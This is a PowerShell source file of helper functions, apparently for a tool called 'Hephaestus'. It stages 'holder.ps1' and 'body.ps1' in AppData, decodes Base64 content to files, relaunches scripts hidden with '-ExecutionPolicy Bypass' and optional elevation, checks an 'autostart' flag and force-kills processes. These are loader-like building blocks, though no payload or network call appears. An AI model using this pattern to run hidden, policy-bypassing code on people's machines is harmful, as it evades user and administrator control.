
function Get-ScriptPath {
    $scriptPaths = @(
        #$MyInvocation.MyCommand.Definition,
        $PSCommandPath,
        $MyInvocation.MyCommand.Path
    )
    
    foreach ($path in $scriptPaths) {
        try {
            if (Test-Path $path) {
                return $path
            }
        }
        catch {
        }
    }
}
function CustomDecode {
    param (
        [string]$inContent,
        [string]$outFile
    )

    #$standardBase64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    #$customBase64Chars   = "QWERTYUIOPLKJHGFDSAZXCVBNMasdfghjklqwertyuiopzxcvbnm9876543210+/"
    
    # $decodedBase64String = $inContent

    # # $decodedBase64String = $decodedBase64String -replace ([regex]::Escape($customBase64Chars)), {
    # #     param($match)
    # #     $standardBase64Chars[$customBase64Chars.IndexOf($match.Value)]
    #}

    try {
        $decodedBytes = [Convert]::FromBase64String($inContent)
        [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
    }
    catch {
        Write-Error "Failed to decode the custom Base64 string: $_"
    }
}


function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

$globalDebug = IsDebug;

function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $hephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $hephaestusFolder
}

function Get-HolderPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'holder' + '.' + 'ps1'
    $holderPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $holderPath
}

function Get-BodyPath {
    $hephaestusFolder = Get-HephaestusFolder
    $scriptName = 'body' + '.' + 'ps1'
    $bodyPath = Join-Path $hephaestusFolder -ChildPath $scriptName
    return $bodyPath
}

function Test-Arg{ param ([string]$arg)
    $globalArgs = $global:args -join ' '
    if ($globalArgs -like "*$arg*") {
        return $true
    }
    return $false
} 


function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}


function RunMe {
    param (
        [string]$script, 
        [string]$argName,
        [string]$argValue,
        [bool]$uac
    )

    try 
    {
        $scriptPath = $script
        
        $local = @("-ExecutionPolicy", "Bypass", "-File", """$scriptPath""")
        
        $globalArgs = $global:args
        foreach ($globalArg in $globalArgs) {
            $local += "-Argument `"$globalArg`""
        }

        if (-not [string]::IsNullOrEmpty($argName)) {
            $local += $argName
            $local += $argValue

        }

        $argumentList = ""
        for ($i = 0; $i -lt $local.Count; $i += 2) {
            $arg = $local[$i]
            $value = if ($i + 1 -lt $local.Count) { $local[$i + 1] } else { "" }
            $argumentList += "$arg $value "
        }

        if ($uac -eq $true) {
            Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList $argumentList
        } else {
            Start-Process powershell.exe -WindowStyle Hidden -ArgumentList $argumentList
        }
    }
    catch {
          writedbg "RunMe $_"
    }
}

function IsElevated
{
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        return $false
    }
    return $true
}


function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}